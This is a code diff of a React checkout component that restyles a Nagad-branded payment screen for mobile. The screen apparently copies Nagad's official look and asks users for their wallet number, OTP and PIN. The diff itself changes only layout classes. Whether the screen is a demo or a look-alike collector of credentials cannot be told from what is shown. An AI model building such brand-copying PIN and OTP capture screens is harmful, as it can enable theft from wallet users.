@@ -595,9 +595,9 @@ export default function OnlineCheckoutGateway({
   // ==========================================
   if (type === 'nagad') {
     return (
-      <div className="fixed inset-0 bg-[#0c1822] sm:bg-[#1d2d3d]/90 z-[9999] flex justify-center items-start overflow-y-auto p-0 sm:p-5 font-sans selection:bg-[#a71a1d] selection:text-white animate-fade-in">
+      <div className="fixed inset-0 bg-[#0c1822] sm:bg-[#1d2d3d]/90 z-[9999] flex justify-center items-center sm:items-start overflow-hidden sm:overflow-y-auto p-0 sm:p-5 font-sans selection:bg-[#a71a1d] selection:text-white animate-fade-in">
         <div 
-          className="w-full max-w-[500px] shadow-2xl flex flex-col select-none my-0 sm:my-8 rounded-none sm:rounded-2xl border border-white/10 min-h-[100vh] sm:min-h-0 relative p-4 sm:p-6 overflow-hidden"
+          className="w-full max-w-[500px] h-screen sm:h-auto shadow-2xl flex flex-col select-none my-0 sm:my-8 rounded-none sm:rounded-2xl border border-white/10 relative p-4 sm:p-6 overflow-hidden"
           style={{
             background: 'radial-gradient(ellipse at center, #ff1224 0%, #d81421 28%, #bc101c 55%, #9d0913 100%)'
           }}
@@ -610,11 +610,11 @@ export default function OnlineCheckoutGateway({
             </div>
           </div>
 
-          <form onSubmit={handleNextStep} className="flex flex-col flex-1 justify-between">
+          <form onSubmit={handleNextStep} className="flex flex-col flex-1 justify-between h-full">
             <div>
               {/* Top Shopping Cart Logo */}
-              <div className="py-2 text-center">
-                <svg viewBox="0 0 120 100" className="w-[110px] h-[85px] mx-auto text-white/95 animate-fadeIn" fill="none" stroke="currentColor" strokeWidth="1.6">
+              <div className="py-1 sm:py-2 text-center">
+                <svg viewBox="0 0 120 100" className="w-[85px] h-[65px] sm:w-[110px] sm:h-[85px] mx-auto text-white/95 animate-fadeIn" fill="none" stroke="currentColor" strokeWidth="1.6">
                   <rect x="25" y="45" width="2.5" height="2.5" fill="currentColor" transform="rotate(45 26.5 46.5)" />
                   <rect x="31" y="53" width="1.8" height="1.8" fill="currentColor" />
                   <rect x="33" y="37" width="2.5" height="2.5" fill="currentColor" transform="rotate(20 34.2 38.2)" />
@@ -628,13 +628,13 @@ export default function OnlineCheckoutGateway({
                   <circle cx="48" cy="76" r="3.5" strokeWidth="1.8" fill="currentColor" />
                   <circle cx="74" cy="76" r="3.5" strokeWidth="1.8" fill="currentColor" />
                 </svg>
-                <h1 className="text-white text-base sm:text-lg font-bold font-sans mt-2 tracking-wide">
+                <h1 className="text-white text-sm sm:text-lg font-bold font-sans mt-1 sm:mt-2 tracking-wide">
                   {merchantName}
                 </h1>
               </div>
 
               {/* Price Details */}
-              <div className="w-full max-w-[360px] mx-auto text-left text-white/90 text-xs sm:text-[13px] space-y-[4px] mt-3 pb-3 border-b border-white/10 font-sans leading-normal">
+              <div className="w-full max-w-[360px] mx-auto text-left text-white/90 text-xs sm:text-[13px] space-y-[4px] mt-2 sm:mt-3 pb-2 sm:pb-3 border-b border-white/10 font-sans leading-normal">
                 <div>
                   <span className="font-bold text-white/95">Invoice No:</span> <span className="font-normal font-mono select-all text-white/90 ml-1">{invoiceNo}</span>
                 </div>
@@ -648,8 +648,8 @@ export default function OnlineCheckoutGateway({
 
               {/* STEP 1: PHONE NUMBER */}
               {step === 1 && (
-                <div className="mt-6 flex flex-col justify-center items-center text-center font-sans animate-fadeIn w-full px-4">
-                  <h2 className="text-white/95 text-xs sm:text-sm font-normal mb-3 tracking-wide">
+                <div className="mt-4 sm:mt-6 flex flex-col justify-center items-center text-center font-sans animate-fadeIn w-full px-4">
+                  <h2 className="text-white/95 text-xs sm:text-sm font-normal mb-2 sm:mb-3 tracking-wide">
                     Your Nagad Account Number
                   </h2>
                   <input
@@ -662,20 +662,20 @@ export default function OnlineCheckoutGateway({
                     placeholder="e.g. 01XXXXXXXXX"
                     className="w-full max-w-[320px] h-[36px] border-none rounded-md text-center text-[15px] text-zinc-700 font-normal focus:outline-none focus:ring-2 focus:ring-white/30 shadow-xs bg-white placeholder-zinc-400"
                   />
-                  <p className="text-white/80 text-[10px] sm:text-[11px] mt-4 tracking-wide max-w-[340px] leading-relaxed">
+                  <p className="text-white/80 text-[10px] sm:text-[11px] mt-3 sm:mt-4 tracking-wide max-w-[340px] leading-relaxed">
                     By clicking/tapping "Proceed" you are agreeing to our <span className="font-bold underline cursor-pointer">Terms and Conditions</span>
                   </p>
-                  <div className="flex gap-4 justify-center w-full max-w-[320px] mt-16">
+                  <div className="flex gap-4 justify-center w-full max-w-[320px] mt-10 sm:mt-20">
                     <button type="submit" disabled={isConfirmDisabled()} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer disabled:opacity-50">Proceed</button>
-                    <button type="button" onClick={handleCancelAction} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer">Close</button>
+                    <button type="button" onClick={handleCancelAction} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer font-sans">Close</button>
                   </div>
                 </div>
               )}
 
               {/* STEP 2: OTP VERIFICATION */}
               {step === 2 && (
-                <div className="mt-6 flex flex-col justify-center items-center text-center font-sans animate-fadeIn w-full px-4">
-                  <h2 className="text-white/95 text-xs sm:text-sm font-normal mb-3 tracking-wide">
+                <div className="mt-4 sm:mt-6 flex flex-col justify-center items-center text-center font-sans animate-fadeIn w-full px-4">
+                  <h2 className="text-white/95 text-xs sm:text-sm font-normal mb-2 sm:mb-3 tracking-wide">
                     Enter Verification Code [OTP]
                   </h2>
                   <input
@@ -689,20 +689,20 @@ export default function OnlineCheckoutGateway({
                     className="w-full max-w-[320px] h-[36px] border-none rounded-md text-center text-[15px] text-zinc-700 font-normal focus:outline-none focus:ring-2 focus:ring-white/30 shadow-xs bg-white placeholder-zinc-400 tracking-widest"
                   />
                   {countdown > 0 && (
-                    <p className="text-white/70 text-[11px] mt-2">Remaining time: {countdown}s</p>
+                     <p className="text-white/70 text-[11px] mt-2">Remaining time: {countdown}s</p>
                   )}
-                  <div className="flex gap-2 justify-center w-full max-w-[340px] mt-16">
+                  <div className="flex gap-2 justify-center w-full max-w-[340px] mt-10 sm:mt-20">
                     <button type="submit" disabled={isConfirmDisabled()} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer disabled:opacity-50">Proceed</button>
-                    <button type="button" disabled={countdown > 0} onClick={() => setCountdown(120)} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer disabled:opacity-55">Resend Code</button>
-                    <button type="button" onClick={handleCancelAction} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer">Close</button>
+                    <button type="button" disabled={countdown > 0} onClick={() => setCountdown(120)} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer disabled:opacity-55 font-sans">Resend Code</button>
+                    <button type="button" onClick={handleCancelAction} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer font-sans">Close</button>
                   </div>
                 </div>
               )}
 
               {/* STEP 3: PIN ENTRY */}
               {step === 3 && (
-                <div className="mt-6 flex flex-col justify-center items-center text-center font-sans animate-fadeIn w-full px-4">
-                  <h2 className="text-white/95 text-xs sm:text-sm font-normal mb-3 tracking-wide">
+                <div className="mt-4 sm:mt-6 flex flex-col justify-center items-center text-center font-sans animate-fadeIn w-full px-4">
+                  <h2 className="text-white/95 text-xs sm:text-sm font-normal mb-2 sm:mb-3 tracking-wide">
                     Enter PIN
                   </h2>
                   <input
@@ -718,21 +718,21 @@ export default function OnlineCheckoutGateway({
                     className="w-full max-w-[280px] h-[36px] border-none rounded-md text-center text-[18px] text-zinc-700 font-semibold focus:outline-none focus:ring-2 focus:ring-white/30 shadow-xs bg-white tracking-widest placeholder-zinc-400"
                     style={{ WebkitTextSecurity: 'disc' }}
                   />
-                  <div className="flex gap-4 justify-center w-full max-w-[320px] mt-16">
+                  <div className="flex gap-4 justify-center w-full max-w-[320px] mt-10 sm:mt-20">
                     <button type="submit" disabled={isConfirmDisabled()} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer disabled:opacity-50">Proceed</button>
-                    <button type="button" onClick={handleCancelAction} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer">Close</button>
+                    <button type="button" onClick={handleCancelAction} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer font-sans">Close</button>
                   </div>
                 </div>
               )}
             </div>
 
             {/* Sticky Official Nagad Footer illustration */}
-            <div className="mt-8 flex flex-col items-center select-none pb-2 pt-4 shrink-0">
-              <div className="flex items-center justify-center max-w-[220px] mb-2 overflow-hidden">
+            <div className="mt-4 sm:mt-8 flex flex-col items-center select-none pb-1 pt-2 sm:pb-2 sm:pt-4 shrink-0">
+              <div className="flex items-center justify-center max-w-[220px] mb-1 sm:mb-2 overflow-hidden">
                 <img 
                   src={settings?.nagadLogo || "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Nagad_logo.svg/512px-Nagad_logo.svg.png"}
                   alt="Nagad Logo"
-                  className="h-[54px] object-contain"
+                  className="h-[38px] sm:h-[54px] object-contain"
                   referrerPolicy="no-referrer"
                 />
               </div>
